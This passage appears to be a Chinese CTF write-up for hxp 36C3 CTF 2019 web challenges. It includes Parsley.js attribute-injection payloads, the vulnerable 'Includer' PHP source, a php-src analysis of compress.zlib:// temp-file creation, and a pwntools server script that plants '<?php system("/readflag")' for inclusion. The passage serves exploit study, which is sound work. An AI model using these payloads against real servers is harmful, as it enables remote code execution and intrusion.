<h6 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h6><h6 id="当然该页面不仅可以使用-a-标签的-href-属性进行获取-writeup-id，也可以获取它-value-值，例如："><a href="#当然该页面不仅可以使用-a-标签的-href-属性进行获取-writeup-id，也可以获取它-value-值，例如：" class="headerlink" title="当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如："></a>当然该页面不仅可以使用 a 标签的 href 属性进行获取 writeup id，也可以获取它 value 值，例如：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">"like"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-trigger</span>=<span class="string">"blur"</span> <span class="attr">autofocus</span></span></span><br><span class="line"><span class="tag">         <span class="attr">name</span>=<span class="string">"some-field"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-error-message</span>=<span class="string">"&lt;input id=like type=button&gt;"</span> <span class="attr">data-parsley-required</span></span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-errors-container</span>=<span class="string">"a:contains('Writeup - 5'):eq(0)"</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="或者使用data-parsley-equalto-API-进行判断属性值："><a href="#或者使用data-parsley-equalto-API-进行判断属性值：" class="headerlink" title="或者使用data-parsley-equalto API 进行判断属性值："></a>或者使用<code>data-parsley-equalto</code> API 进行判断属性值：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data-parsley-equalto=”#anotherfield”</span><br><span class="line"></span><br><span class="line">Validates that the value is identical to another field’s value (useful for password confirmation check).</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-trigger</span>=<span class="string">"focusout"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-equalto</span>=<span class="string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-errors-container</span>=<span class="string">"form[action='/like.php']"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-error-message</span>=<span class="string">'&lt;input type="input" name="id" value="0000000000000000"&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">value</span>=<span class="string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-Includer"><a href="#0x03-Includer" class="headerlink" title="0x03 Includer"></a>0x03 Includer</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: medium</span><br><span class="line"></span><br><span class="line">Solved:9/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 · min(1, 10 / (9 + [9 solves]))) = 556 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Just sitting here and waiting for PHP 8.0 (lolphp).</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="题目给出源代码以及部署文件，源代码如下："><a href="#题目给出源代码以及部署文件，源代码如下：" class="headerlink" title="题目给出源代码以及部署文件，源代码如下："></a>题目给出源代码以及部署文件，源代码如下：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="string">'files/'</span>.bin2hex(random_bytes(<span class="number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="keyword">die</span>(<span class="string">'mkdir'</span>);</span><br><span class="line">putenv(<span class="string">'TMPDIR='</span>.<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$rand_dir) || <span class="keyword">die</span>(<span class="string">'putenv'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello '</span>.$_POST[<span class="string">'name'</span>].<span class="string">' your sandbox: '</span>.$rand_dir.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(file_get_contents($_POST[<span class="string">'file'</span>]), <span class="string">'&lt;?'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include_once</span>($_POST[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    system(<span class="string">'rm -rf '</span>.escapeshellarg($rand_dir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration Error</h6><h6 id="其中配置文件有一个比较明显的配置错误："><a href="#其中配置文件有一个比较明显的配置错误：" class="headerlink" title="其中配置文件有一个比较明显的配置错误："></a>其中配置文件有一个比较明显的配置错误：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known &#123;</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="开启了列目录并且我们可以遍历到上层文件夹。"><a href="#开启了列目录并且我们可以遍历到上层文件夹。" class="headerlink" title="开启了列目录并且我们可以遍历到上层文件夹。"></a>开启了列目录并且我们可以遍历到上层文件夹。</h6><h6 id="Update-Arbitrary-Data"><a href="#Update-Arbitrary-Data" class="headerlink" title="Update Arbitrary Data"></a>Update Arbitrary Data</h6><h6 id="一开始看到过滤了-lt-，就想到了p牛博客里面有关死亡exit的内容，谈一谈php-filter的妙用，但是p牛的原文用的是file-put-content，但是这里用的是file-get-contents，并且这里的判断也在使用了file-get-contents函数之后进行判断是否有-lt-，所以这里的编码绕过就不太可能了。"><a href="#一开始看到过滤了-lt-，就想到了p牛博客里面有关死亡exit的内容，谈一谈php-filter的妙用，但是p牛的原文用的是file-put-content，但是这里用的是file-get-contents，并且这里的判断也在使用了file-get-contents函数之后进行判断是否有-lt-，所以这里的编码绕过就不太可能了。" class="headerlink" title="一开始看到过滤了&lt;?，就想到了p牛博客里面有关死亡exit的内容，谈一谈php://filter的妙用，但是p牛的原文用的是file_put_content，但是这里用的是file_get_contents，并且这里的判断也在使用了file_get_contents函数之后进行判断是否有&lt;?，所以这里的编码绕过就不太可能了。"></a>一开始看到过滤了<code>&lt;?</code>，就想到了p牛博客里面有关死亡<code>exit</code>的内容，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a>，但是p牛的原文用的是<code>file_put_content</code>，但是这里用的是<code>file_get_contents</code>，并且这里的判断也在使用了<code>file_get_contents</code>函数之后进行判断是否有<code>&lt;?</code>，所以这里的编码绕过就不太可能了。</h6><h6 id="而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv-函数等，给了我们一个sandbox，然而我们似乎无法利用表面的代码进行文件上传等操作。"><a href="#而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv-函数等，给了我们一个sandbox，然而我们似乎无法利用表面的代码进行文件上传等操作。" class="headerlink" title="而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了putenv()函数等，给了我们一个sandbox，然而我们似乎无法利用表面的代码进行文件上传等操作。"></a>而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了<code>putenv()</code>函数等，给了我们一个<code>sandbox</code>，然而我们似乎无法利用表面的代码进行文件上传等操作。</h6><h6 id="balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。"><a href="#balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。" class="headerlink" title="balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。"></a>balsn队伍在公开的wp中写了比较详细的源码分析，这里我就配合其中的wp进行一下简单的分析。</h6><h6 id="首先直接给出结论，我们可以使用compress-zlib-流进行上传任意文件，接着我们来看看相关原理。"><a href="#首先直接给出结论，我们可以使用compress-zlib-流进行上传任意文件，接着我们来看看相关原理。" class="headerlink" title="首先直接给出结论，我们可以使用compress.zlib://流进行上传任意文件，接着我们来看看相关原理。"></a>首先直接给出结论，我们可以使用<code>compress.zlib://</code>流进行上传任意文件，接着我们来看看相关原理。</h6><h6 id="在php-src源码中，我们可以找到该流的相关触发解析函数php-stream-gzopen"><a href="#在php-src源码中，我们可以找到该流的相关触发解析函数php-stream-gzopen" class="headerlink" title="在php-src源码中，我们可以找到该流的相关触发解析函数php_stream_gzopen"></a>在<a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a>源码中，我们可以找到该流的相关触发解析函数<code>php_stream_gzopen</code></h6><h6 id="ext-zlib-zlib-fopen-wrapper-c"><a href="#ext-zlib-zlib-fopen-wrapper-c" class="headerlink" title="ext/zlib/zlib_fopen_wrapper.c"></a><code>ext/zlib/zlib_fopen_wrapper.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">php_stream *<span class="title">php_stream_gzopen</span><span class="params">(php_stream_wrapper *wrapper, <span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">							  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="literal">true</span>...</span><br><span class="line">trueif (strncasecmp(<span class="string">"compress.zlib://"</span>, path, <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">truetruepath += <span class="number">16</span>;</span><br><span class="line"><span class="literal">true</span>&#125; <span class="keyword">else</span> <span class="keyword">if</span> (strncasecmp(<span class="string">"zlib:"</span>, path, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">truetruepath += <span class="number">5</span>;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line"><span class="literal">true</span>...</span><br><span class="line">truereturn <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到有个标志位STREAM-WILL-CAST，我们可以先看看这个标志位用来干嘛，在main-php-streams-h定义了该标志位"><a href="#我们可以看到有个标志位STREAM-WILL-CAST，我们可以先看看这个标志位用来干嘛，在main-php-streams-h定义了该标志位" class="headerlink" title="我们可以看到有个标志位STREAM_WILL_CAST，我们可以先看看这个标志位用来干嘛，在main/php_streams.h定义了该标志位:"></a>我们可以看到有个标志位<code>STREAM_WILL_CAST</code>，我们可以先看看这个标志位用来干嘛，在<code>main/php_streams.h</code>定义了该标志位:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="comment"> * up working more optimally.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></table></figure>

<h6 id="很明显，这是一个用来将stream转换成FILE-的标志位，在这里就与我们创建临时文件有关了。"><a href="#很明显，这是一个用来将stream转换成FILE-的标志位，在这里就与我们创建临时文件有关了。" class="headerlink" title="很明显，这是一个用来将stream转换成FILE*的标志位，在这里就与我们创建临时文件有关了。"></a>很明显，这是一个用来将stream转换成FILE*的标志位，在这里就与我们创建临时文件有关了。</h6><h6 id="接着我们跟进php-stream-open-wrapper-ex函数，该函数在main-php-streams-h中被define为-php-stream-open-wrapper-ex。"><a href="#接着我们跟进php-stream-open-wrapper-ex函数，该函数在main-php-streams-h中被define为-php-stream-open-wrapper-ex。" class="headerlink" title="接着我们跟进php_stream_open_wrapper_ex函数，该函数在main/php_streams.h中被define为_php_stream_open_wrapper_ex。"></a>接着我们跟进<code>php_stream_open_wrapper_ex</code>函数，该函数在<code>main/php_streams.h</code>中被define为<code>_php_stream_open_wrapper_ex</code>。</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="literal">true</span><span class="comment">//...</span></span><br><span class="line">trueif (stream != <span class="literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) &#123;</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrueswitch(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">truereturn stream;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<h6 id="该函数调用了php-stream-make-seekable-rel，并向其中传入了STREAM-WILL-CAST参数，我们跟进php-stream-make-seekable-rel函数，它在main-php-streams-h中被define为-php-stream-make-seekable，继续跟进"><a href="#该函数调用了php-stream-make-seekable-rel，并向其中传入了STREAM-WILL-CAST参数，我们跟进php-stream-make-seekable-rel函数，它在main-php-streams-h中被define为-php-stream-make-seekable，继续跟进" class="headerlink" title="该函数调用了php_stream_make_seekable_rel，并向其中传入了STREAM_WILL_CAST参数，我们跟进php_stream_make_seekable_rel函数，它在main/php_streams.h中被define为_php_stream_make_seekable，继续跟进"></a>该函数调用了<code>php_stream_make_seekable_rel</code>，并向其中传入了<code>STREAM_WILL_CAST</code>参数，我们跟进<code>php_stream_make_seekable_rel</code>函数，它在<code>main/php_streams.h</code>中被define为<code>_php_stream_make_seekable</code>，继续跟进</h6><h6 id="main-streams-cast-c"><a href="#main-streams-cast-c" class="headerlink" title="main/streams/cast.c"></a><code>main/streams/cast.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="keyword">int</span> flags STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line">trueif (newstream == <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruereturn PHP_STREAM_FAILED;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"><span class="literal">true</span>*newstream = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">trueif (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;seek != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetruereturn PHP_STREAM_UNCHANGED;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="literal">true</span><span class="comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">trueif (flags &amp; PHP_STREAM_PREFER_STDIO) &#123;</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line"><span class="literal">true</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"><span class="literal">true</span><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到如果flags与PHP-STREAM-PREFER-STDIO都被设置的话，而PHP-STREAM-PREFER-STDIO在main-php-streams-h中已经被define。"><a href="#我们可以看到如果flags与PHP-STREAM-PREFER-STDIO都被设置的话，而PHP-STREAM-PREFER-STDIO在main-php-streams-h中已经被define。" class="headerlink" title="我们可以看到如果flags与PHP_STREAM_PREFER_STDIO都被设置的话，而PHP_STREAM_PREFER_STDIO在main/php_streams.h中已经被define。"></a>我们可以看到如果<code>flags</code>与<code>PHP_STREAM_PREFER_STDIO</code>都被设置的话，而<code>PHP_STREAM_PREFER_STDIO</code>在<code>main/php_streams.h</code>中已经被define。</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_STREAM_PREFER_STDIO		1</span></span><br></pre></td></tr></table></figure>

<h6 id="我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了php-stream-fopen-tmpfile函数创建了临时文件。"><a href="#我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了php-stream-fopen-tmpfile函数创建了临时文件。" class="headerlink" title="我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了php_stream_fopen_tmpfile函数创建了临时文件。"></a>我们只需要关心flags的值就好了，我们只需要确定flags的值非零即可，根据前面的跟进我们易知flags的在这里非零，所以这里就调用了<code>php_stream_fopen_tmpfile</code>函数创建了临时文件。</h6><h6 id="于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件"><a href="#于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件" class="headerlink" title="于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件"></a>于是我们可以做一个简单的验证，在本机上跑源代码，并用pwntools起一个服务用来发送一个大文件</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_chunk</span><span class="params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="string">'''&#123;&#125;\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">'''</span>.format(hex(len(data))[<span class="number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    l = listen(<span class="number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">''</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'X'</span>)</span><br><span class="line">    data2 = <span class="string">'&lt;?php system("/readflag"); exit(); /*'</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'b'</span>)</span><br><span class="line">    data3 = <span class="string">'c*/'</span>.rjust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="string">'\r\n\r\n'</span>)</span><br><span class="line">    l.send(<span class="string">'''HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'waiting...'</span>)</span><br><span class="line">    print(<span class="string">'sending php code...'</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="string">'''0\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></table></figure>

<h6 id="这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。"><a href="#这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。" class="headerlink" title="这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。"></a>这样我在本机上用fswatch很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-1.png" alt></p>
<h6 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h6><h6 id="临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。"><a href="#临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。" class="headerlink" title="临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。"></a>临时文件终究还是会被php删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留在服务器上，这样我们才有机会去包含它。</h6><h6 id="所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间："><a href="#所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：" class="headerlink" title="所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间："></a>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</h6><ul>
<li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li>
<li>使用FTP速度控制，大文件传输基本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用<code>compress.zlib://ftp://</code>形式，控制FTP速度即可</li>
</ul>
<h6 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h6><h6 id="接下来我们就要看如何来对关键地方进行绕过了。"><a href="#接下来我们就要看如何来对关键地方进行绕过了。" class="headerlink" title="接下来我们就要看如何来对关键地方进行绕过了。"></a>接下来我们就要看如何来对关键地方进行绕过了。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (stripos(file_get_contents($_POST[<span class="string">'file'</span>]), <span class="string">'&lt;?'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">include_once</span>($_POST[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

